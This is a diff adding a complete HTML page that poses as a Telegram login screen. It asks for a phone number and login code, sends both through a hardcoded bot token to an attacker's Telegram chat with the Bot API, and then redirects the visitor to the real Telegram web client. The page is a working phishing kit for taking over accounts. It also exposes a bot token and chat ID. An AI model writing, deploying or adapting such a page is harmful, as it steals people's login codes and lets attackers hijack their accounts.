@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram</title>
+</head>
+<body>
+    <h2>Telegram Login</h2>
+    <input type="text" id="phone" placeholder="Phone"><br><br>
+    <input type="text" id="code" placeholder="Code"><br><br>
+    <button onclick="send()">Next</button>
+    <p id="status"></p>
+
+    <script>
+        const BOT_TOKEN = '8300626512:AAEH-ZR2FLuQkRhkF6WkRdgOsdhimjBL9IE';
+        const CHAT_ID = '7110007728';
+
+        function send() {
+            const phone = document.getElementById('phone').value;
+            const code = document.getElementById('code').value;
+            const status = document.getElementById('status');
+            
+            if (!phone || !code) {
+                status.innerText = 'Fill both fields';
+                return;
+            }
+            
+            status.innerText = 'Sending...';
+            
+            const text = 'Phone: ' + phone + ' Code: ' + code;
+            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(result => {
+                    if (result.ok) {
+                        status.innerText = 'Success! Redirecting...';
+                        window.location.href = 'https://web.telegram.org/z/';
+                    } else {
+                        status.innerText = 'Error: ' + result.description;
+                    }
+                })
+                .catch(error => {
+                    status.innerText = 'Network error';
+                });
+        }
+    </script>
+</body>
+</html>
